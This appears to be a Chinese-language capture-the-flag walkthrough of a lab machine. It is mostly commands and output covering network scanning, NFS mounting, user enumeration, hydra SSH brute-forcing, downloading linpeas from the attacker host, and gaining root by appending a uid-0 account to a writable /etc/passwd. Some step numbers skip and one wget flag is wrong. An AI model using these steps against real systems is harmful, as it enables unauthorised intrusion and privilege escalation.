1. 偵測在同一個網段內有哪些裝置在線
    ```
    $ sudo netdiscover -i eth0
    ``` 
2. 掃描 IP
    ```
    $ nmap 192.168.121.129 -sV
    PORT       STATE SERVICE       VERSION
    22/tcp     open  ssh                OpenSSH 9.6 (protocol 2.0)
    80/tcp     open  http               Apache httpd 2.4.58 ((Unix))
    111/tcp   open  rpcbind         2-4 (RPC #100000)
    139/tcp   open  netbios-ssn   Samba smbd 4.6.2
    445/tcp   open  netbios-ssn   Samba smbd 4.6.2
    2049/tcp open  nfs                3-4 (RPC #100003)
    3306/tcp open  mysql           MariaDB (unauthorized)
    8080/tcp open  http              Apache httpd 2.4.58 ((Unix))
    ```
3. 知道哪個資料夾可用於安裝伺服器
    ```
    $ showmount -e 192.168.121.129` 
    Export list for 192.168.121.129:
    /home/john/share *
    ```
4. 將遠端 NFS 共享目錄掛載到本地目錄
    ```
    $ sudo mount -t nfs -o nolock 192.168.121.129:/home/john/share ~/Desktop/alpine
    ```
5. 輸出共享目錄、使用者帳號、群組資訊
    ```
    $ enum4linux -a 192.168.121.129 
    S-1-22-1-1000 Unix User\onward (Local User)
    S-1-22-1-1001 Unix User\john (Local User)
    S-1-22-1-1002 Unix User\ariel (Local User)
    ```
6. 使用三個帳號名分別爆破密碼
    ```
    $ hydra -l ariel -P ~/Desktop/passwd.txt ssh://192.168.121.129 
    ```
7. 連線至遠端伺服器
    ```
    $ ssh ariel@192.168.121.129
    ```
8. 拿到第一個 flag
    ```
    $ cat flag
    onward{0nw4rd41pin3_4ri3l_fl4g}
    ```
9. 攻擊端監聽
    ```
    $ python -m http.server
    ```
    受害端取得 kali 端的 linpeas.sh
    ```
    $ wget 192.168.121.128:8000/linpeas.sh -o /tmp/linpeas.sh
    $ cd /tmp
    $ chmod +x linpeas.sh
    ```
13. 執行 linpeas
    ```
    $ ./linpeas.sh
    /etc/passwd is writable
    ```
14. 查看 `/etc/passwd`
    ```
    $ ls -la /etc/passwd
    -rw-rw-rw-    1 root     root          1532 Dec 27  2023 /etc/passwd
    ```
    - 發現需要提權並且任何用戶都可讀寫
15. 開始提權
    ```
    $ openssl passwd -1 -salt hack hack
    ```
    - 使用openssl工具加密密碼
    ```
    $ echo 'hack:$1$hack$xR6zsfvpez/t8teGRRSNr.:0:0::/root:/bin/ash' >> /etc/passwd
    ```
    - 整理生成的密碼和將要寫入 `etc/passwd` 數據格式。這時已將 `root` 的密碼換成先前生成的 `hack`
17. 切換到剛創建的root權限用戶
    ```
    $ su hack
    ```
18. 印出第二個 flag
    ```
    $ cat flag`
    onward{0nw4rd41pin3_root_fl4g}
    ```
19. 直接搜索所有文件找第三個 flag
    ```
    $ grep -ri "flag" /var/www` 
    onward{0nw4rd41pin3_w3b_fl4g_byp455_403}
    ``` 